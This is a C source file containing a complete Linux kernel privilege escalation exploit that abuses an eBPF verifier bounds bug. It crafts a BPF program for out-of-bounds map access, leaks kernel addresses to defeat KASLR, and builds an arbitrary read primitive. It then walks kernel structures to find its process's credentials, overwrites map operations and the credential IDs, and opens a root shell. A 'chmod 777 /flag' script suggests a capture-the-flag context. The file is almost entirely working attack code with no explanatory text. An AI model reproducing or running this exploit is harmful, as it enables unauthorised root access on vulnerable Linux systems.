#define _GNU_SOURCE
#include <stdio.h>       
#include <stdlib.h>      
#include <unistd.h>      
#include <fcntl.h>       
#include <stdint.h>      
#include <string.h>      
#include <sys/ioctl.h>   
#include <sys/syscall.h> 
#include <sys/socket.h>  
#include <errno.h>       
#include <sys/prctl.h>  
#include "linux/bpf.h"   
#include "bpf_insn.h"    
#define LOG_BUF_SIZE 65535
#define RADIX_TREE_INTERNAL_NODE 2
#define RADIX_TREE_MAP_MASK 0x3f
//#define RADIX_TREE_MAP_MASK 0xf

#define BPF_MAP_GET(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */

#define BPF_MAP_GET_ADDR(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_MOV64_REG((dst), BPF_REG_0)          	  /* r_dst = (r0)   */

int ctrlmapfd, expmapfd;
int progfd;
int sockets[2];
char* ctrlbuf; 
char* expbuf; 
char info[0x100];

char bpf_log_buf[LOG_BUF_SIZE];

static uint32_t arbitrary_read(uint64_t addr);
static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info);
static uint64_t read_8byte(uint64_t addr);
void get_shell();

void gen_fake_elf(){
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /my_exp"); 
    system("chmod +x /my_exp");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /fake");
    system("chmod +x /fake");
}
void init(){
    setbuf(stdin,0);
    setbuf(stdout,0);
    gen_fake_elf();
}
void x64dump(char *buf,uint32_t num){         
    uint64_t *buf64 =  (uint64_t *)buf;       
    printf("[-x64dump-] start : \n");         
    for(int i=0;i<num;i++){                   
            if(i%2==0 && i!=0){                   
                printf("\n");                     
            }                                     
            printf("0x%016lx ",*(buf64+i));       
        }                                         
    printf("\n[-x64dump-] end ... \n");       
}                                             
void loglx(char *tag,uint64_t num){         
    printf("[lx] ");                        
    printf(" %-20s ",tag);                  
    printf(": %-#16lx\n",num);              
}                                           

static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version);      
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries);                                                 
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags);
static int bpf_lookup_elem(int fd,void *key, void *value);
static void writemsg(void);
static void __exit(char *err);

struct bpf_insn insns[]={
    //
    BPF_LD_MAP_FD(9,3),             //r9 = ctrl_map_fd
    BPF_MAP_GET(0,5),               //r5 = ctrl_map_fd[0], r0 = &ctrl_map
    BPF_ALU64_IMM(BPF_MOV,0,1),
    BPF_JMP32_IMM(BPF_JLE, 5, 0x7fffffff, 1),  //if r5 > 0:jmp pc+1
    BPF_EXIT_INSN(),				//r5->min_val = 1
    BPF_JMP_IMM(BPF_JGT, 5, 0, 1),  //if r5 > 0:jmp pc+1
    BPF_EXIT_INSN(),				//r5->min_val = 1
    
	BPF_LD_IMM64(6, 0x600000002),	//r6 = 0x600000002
	BPF_JMP_REG(BPF_JLT, 5, 6, 1),	//if r5 < r:jmp pc+1
	BPF_EXIT_INSN(),				//r5->max_val = 0x100000001

	BPF_ALU64_IMM(BPF_OR, 5, 0),	//r5 |= 0
	BPF_MOV32_REG(6, 5),			//r6_32 = r5_32
	BPF_ALU64_IMM(BPF_RSH, 6, 1),	//r6 >>= 1
    BPF_ALU64_IMM(BPF_MUL,6,0x110), //r6 *= 0x110

    BPF_LD_MAP_FD(9,4),      //r9 = exp_map_fd
    BPF_MAP_GET_ADDR(0,7),          //r7 = &exp_map
    BPF_ALU64_IMM(BPF_MOV,0,1),
    BPF_ALU64_REG(BPF_SUB,7,6),     //r7 -= r6

    //
    BPF_LD_MAP_FD(9,3),             //r9 = ctrl_map_fd
    BPF_MAP_GET_ADDR(0,6),          //r6 = %ctrl_map
    BPF_ALU64_IMM(BPF_MOV,0,1),
    BPF_LDX_MEM(BPF_DW,0,7,0),      //r0 = [r7+0]
    BPF_STX_MEM(BPF_DW,6,0,0x10),   //r6+0x10 = r0 = ctrl_map[2]
    BPF_LDX_MEM(BPF_DW,0,7,0xc0),   //r0 = [r7+0xc0]
    BPF_STX_MEM(BPF_DW,6,0,0x18),   //r6+0x18 = r0 = ctrl_map[3]
    BPF_ALU64_IMM(BPF_ADD,0,0x50),  //r0 += 0x50 => element_addr
    
	//ctrl_buf[1] -> 1:read 2:write
    BPF_LDX_MEM(BPF_DW,8,6,8),      //r8 = [r6+8] = ctrl_map[1]
    BPF_JMP_IMM(BPF_JNE,8,0x1,6),

    //arb read

	BPF_LDX_MEM(BPF_DW,0,6,0x20),   // r0 = [r6+0x20] = ctrl_buf[4]
    BPF_STX_MEM(BPF_DW,7,0,0x40),   //*(r7+0x40) = r0
    BPF_ALU64_IMM(BPF_MOV,5,0x1234),     //test:r5 = 1
    BPF_ALU64_IMM(BPF_MUL,5,0x6),     //test:r5 = 1
    BPF_ALU64_IMM(BPF_MOV,0,0),     //
    BPF_EXIT_INSN(),

	//arbwrite
    BPF_JMP_IMM(BPF_JNE,8,0x2,4),
    BPF_STX_MEM(BPF_DW,7,0,0),      //[r7] = [ops] = r0 = element_addr
    BPF_ST_MEM(BPF_W,7,0x18,BPF_MAP_TYPE_STACK),//[ops+0x18] = BPF_MAP_TYPE_STACK
    BPF_ST_MEM(BPF_W,7,0x24,-1),   //max_entries
    BPF_ST_MEM(BPF_W,7,0x2c,0),    //locak_off

	//exit
    BPF_ALU64_IMM(BPF_MOV,0,0),     //
    BPF_EXIT_INSN(),
};

void  prep(){
    ctrlmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,0x1);
    if(ctrlmapfd<0){ __exit(strerror(errno));}
    expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x2000,0x1);
    if(expmapfd<0){ __exit(strerror(errno));}
    printf("ctrlmapfd: %d,  expmapfd: %d \n",ctrlmapfd,expmapfd);

    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
            insns, sizeof(insns), "GPL", 0);  
    if(progfd < 0){ __exit(strerror(errno));}

    if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)){
        __exit(strerror(errno));
    }
    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){ 
        __exit(strerror(errno));
    }
}

void pwn(){
    printf("pwning...\n");
    uint32_t key = 0x0;
    ctrlbuf = malloc(0x100);
    expbuf  = malloc(0x3000);

    uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
    uint64_t *expbuf64  = (uint64_t *)expbuf;

    memset(ctrlbuf,'A',0x100);
    for(int i=0;i<0x2000/8;i++){
        expbuf64[i] = i+1;
    }
    ctrlbuf64[0]=2;
    ctrlbuf64[1]=0;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    bpf_update_elem(expmapfd,&key,expbuf,0);
    writemsg();

    // leak
    memset(ctrlbuf,0,0x100);
    bpf_lookup_elem(ctrlmapfd,&key,ctrlbuf);
    //x64dump(ctrlbuf,8);
    bpf_lookup_elem(expmapfd,&key,expbuf);
    //x64dump(expbuf,8);
    uint64_t map_leak = ctrlbuf64[2];
    uint64_t elem_leak = ctrlbuf64[3]-0xc0+0x110;
    //uint64_t kaslr = map_leak - 0xffffffff82016340;
    uint64_t kaslr = map_leak - 0xffffffff820488c0;
    uint64_t kernel_base = map_leak - 0x10488c0;
    loglx("map_leak",map_leak);
    loglx("elem_leak",elem_leak);
    loglx("kaslr",kaslr);
    loglx("kernel base => ",kernel_base);

    //loglx("modprobe",modprobe_path);
    getchar();
    //leak cred
    uint64_t init_pid_ns_str,init_pid_ns_ptr, start_search, addr;
    uint32_t read_low, read_high;
    //start_search = kernel_base+(0xFFFFFFFF82615C80-0xffffffff81000000-0x1000000);
    //start_search = kernel_base+0x12f0000;

    //start_search = 0xFFFFFFFF826613C0;
    /*
    for(int i = 0 ; i < 1; i += 1){
        addr = start_search + i; 
        read_low = arbitrary_read(addr);
        if(read_low == 0x74696e69 ){
            read_high = arbitrary_read(addr + 4);
            if(read_high == 0x6469705f){
                printf("[+] found init_pid_ns in __kstrtab_init_pid_ns\n");
                init_pid_ns_str = addr; 
                printf("[+] --init_pid_ns_str addr : 0x%lx\n", init_pid_ns_str);
                break;
            }
        }
    }
    */
    uint64_t off = kernel_base - 0xffffffff81000000;
    init_pid_ns_str = 0xffffffff8248ea94 + off;
	printf("[+] --init_pid_ns_str addr : 0x%lx\n", init_pid_ns_str);
	/*
    start_search = kernel_base+(0xffffffff8248ea94-0xffffffff81000000);

    uint32_t offset_str, offset_ptr;
    for(int i = 0 ; i < 0x2a000; i += 4){
        addr = start_search + i;
        offset_str = arbitrary_read(addr);

        if((addr + offset_str) == init_pid_ns_str){
            offset_ptr = arbitrary_read(addr - 4);
            init_pid_ns_ptr = (addr - 4) + offset_ptr; 
            printf("[+] found init_pid_ns_ptr in __ksymtab_init_pid_ns\n");
            printf("[+] --init_pid_ns_ptr addr : 0x%lx\n", init_pid_ns_ptr);
            break;
        }
    }

	*/
	init_pid_ns_ptr = 0xffffffff82660500 + off;
    //0xffffffff82660500
	printf("[+] --init_pid_ns_ptr addr : 0x%lx\n", init_pid_ns_ptr);
	char target[16];

	strcpy(target,"ama2in9");
	prctl(PR_SET_NAME,target); 
    init_pid_ns_ptr = 0xffffffff82660500 + off;
    //p/x &(*(struct pid_namespace *)0)->id:0x8
    //p/x &(*(struct idr *)0)->idr_base:0x10
    uint32_t idr_base = arbitrary_read(init_pid_ns_ptr+0x18);
	printf("[+] idr_base addr: 0x%lx, value: 0x%x\n",(uint64_t)(init_pid_ns_ptr+0x18), idr_base);
    pid_t pid = getpid();
    printf("[+] pid = %d\n", pid);

	uint64_t index = pid - idr_base;
    printf("[+] index : 0x%lx\n",index);

	uint64_t root = init_pid_ns_ptr + 0x8; // &ns->idr &idr->idr_rt
    printf("[+] &ns->idr, &idr->idr_rt, root: 0x%lx\n",root);

	uint64_t xa_head = read_8byte(root + 0x8); // &root->xa_head 
    printf("[+] root->xa_head: 0x%lx\n", xa_head);
    uint64_t node = xa_head;
	//ok now
    while(1){
        uint64_t parent = node & (~RADIX_TREE_INTERNAL_NODE);
        printf("[+] -- parent: 0x%lx\n", parent);
        uint64_t shift = arbitrary_read(parent) & 0xff;
        uint64_t offset = (index >> shift) & RADIX_TREE_MAP_MASK;
        printf("[+] -- shift: 0x%lx, offset: 0x%lx\n",shift,  offset);
        /*
         *
         * 00000000 xa_node         struc ; (sizeof=0x240, align=0x8, copyof_545)
         * 00000000 shift           db ?
         * 00000001 offset          db ?
         * 00000002 count           db ?
         * 00000003 nr_values       db ?
         * 00000004                 db ? ; undefined
         * 00000005                 db ? ; undefined
         * 00000006                 db ? ; undefined
         * 00000007                 db ? ; undefined
         * 00000008 parent          dq ?                    ; offset
         * 00000010 array           dq ?                    ; offset
         * 00000018 _anon_0         $51C2B2DBB912CC1316ADCDFAD91E57A5 ?
         * 00000028 slots           dq 64 dup(?)            ; offset
         * 00000228 _anon_1         {
         * A501CE09537B87F8E1A28FB1D101D70 ?
         * 00000240 xa_node         ends
         * }
        */
        node = read_8byte(parent + 0x28 + offset*0x8); //parent->slots[offset]
        printf("[+] -- node: 0x%lx\n", node);

        if(shift == 0){
            break;
        }
   }
	uint64_t first = read_8byte(node + 0x10); //*&pid->tasks[0] 
    printf("[+] first: 0x%lx\n", first);

    uint64_t task_struct = first - 0x940; // &(*(struct task_struct *)0)->pid_links[0] = 0x940
    uint64_t comm = read_8byte(task_struct + 0xa88);
    printf("[+] comm: %s\n", (char*)(&comm)); // get comm to check

    uint64_t cred = read_8byte(task_struct + 0xa78);// get cred addr 
    printf("[+] cred: 0x%lx\n", cred);
    getchar();
    uint64_t fake_map_ops[]={
        kaslr + 0xffffffff811f9d70,
        kaslr + 0xffffffff811fae80,
        0x0,
        kaslr + 0xffffffff811fa5e0,
        kaslr + 0xffffffff811f9e60, //get net key 5
        0x0,
        0x0,
        kaslr + 0xffffffff811dee60,
        0x0,
        kaslr + 0xffffffff811dec20,
        0x0,
        kaslr + 0xffffffff811f9f20,
        kaslr + 0xffffffff811fa4c0,
        kaslr + 0xffffffff811f9ea0,
        kaslr + 0xffffffff811f9e60, //map_push_elem 15
        0x0,
        0x0,
        0x0,
        0x0,
        kaslr + 0xffffffff811fa210,
        0x0,
        kaslr + 0xffffffff811fa030,
        kaslr + 0xffffffff811fac70,
        0x0,
        0x0,
        0x0,
        kaslr + 0xffffffff811f9df0,
        kaslr + 0xffffffff811f9e20,
        kaslr + 0xffffffff811f9fc0,
        0,
    };
    // overwrite bpf_map_ops
    memcpy(expbuf,(void *)fake_map_ops,sizeof(fake_map_ops));
    bpf_update_elem(expmapfd,&key,expbuf,0);

    //overwrite fake ops
    ctrlbuf64[0]=0x2;
    ctrlbuf64[1]=0x2;
    bpf_update_elem(ctrlmapfd,&key,ctrlbuf,0);
    bpf_update_elem(expmapfd,&key,expbuf,0);
    writemsg();
    //overwrite the cred
    cred += 0x10;
    expbuf64[0] = 0x0-1;
    for(int i = 0; i < 8; i++){
        bpf_update_elem(expmapfd, &key, expbuf, cred+4+i*4);
    }
    return;
}


int main(int argc,char **argv){
    init();
    prep();
    pwn();
	get_shell();
    return 0;
}

void get_shell(){

    if(!getuid())
    {
        printf("[+] you got root!\n");
        system("/bin/sh");
    }
    else
    {
        printf("[T.T] privilege escalation failed !!!\n");
    }
    exit(0);

}

static void __exit(char *err) {              
    fprintf(stderr, "error: %s\n", err); 
    exit(-1);                            
}                                            

static void writemsg(void) 
{
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n < 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, "short write: %lu\n", n);
}


static int bpf_prog_load(enum bpf_prog_type prog_type,         
        const struct bpf_insn *insns, int prog_len,  
        const char *license, int kern_version){

    union bpf_attr attr = {                                        
        .prog_type = prog_type,                                
        .insns = (uint64_t)insns,                              
        .insn_cnt = prog_len / sizeof(struct bpf_insn),        
        .license = (uint64_t)license,                          
        .log_buf = (uint64_t)bpf_log_buf,                      
        .log_size = LOG_BUF_SIZE,                              
        .log_level = 1,                                        
    };                                                             
    attr.kern_version = kern_version;                              
    bpf_log_buf[0] = 0;                                            
    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));  

}
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,  
        int max_entries){

    union bpf_attr attr = {                                         
        .map_type = map_type,                                   
        .key_size = key_size,                                   
        .value_size = value_size,                               
        .max_entries = max_entries                              
    };                                                              
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));  

}                                                
static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
        .flags = flags,                                              
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));  

}
static int bpf_lookup_elem(int fd,void *key, void *value){
    union bpf_attr attr = {                                              
        .map_fd = fd,                                                
        .key = (uint64_t)key,                                        
        .value = (uint64_t)value,                                    
    };                                                                   
    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));  
}

static uint32_t arbitrary_read(uint64_t addr){
        uint32_t read_info;
        
        uint32_t key = 0x0;
        uint64_t *ctrlbuf64 = (uint64_t *)ctrlbuf;
        uint64_t *expbuf64  = (uint64_t *)expbuf;

        memset(ctrlbuf,'A',0x100);
        for(int i=0;i<0x2000/8;i++){
            expbuf64[i] = i+1;
        }
        
        ctrlbuf64[0] = 0x2;
        ctrlbuf64[1] = 1;
        ctrlbuf64[4] = addr - 0x58;

        //x64dump(expbuf,8);

	    bpf_update_elem(ctrlmapfd, &key, ctrlbuf64, 0);
        bpf_update_elem(expmapfd, &key, expbuf64, 0);
        writemsg();

        read_info =  bpf_map_get_info_by_fd(0, expbuf, expmapfd, info);
        return read_info;
}

static uint64_t read_8byte(uint64_t addr){

    uint32_t addr_low = arbitrary_read(addr);
    uint32_t addr_high = arbitrary_read(addr + 0x4);
    return ((uint64_t)addr_high << 32) | addr_low;
}

static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info) 
{
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&key,
		.value = (__u64)value,
        .info.bpf_fd = mapfd,
        .info.info_len = 0x100,
        .info.info = (__u64)info,
	};

	syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));

    return *(uint32_t *)((char *)info+0x40);
}


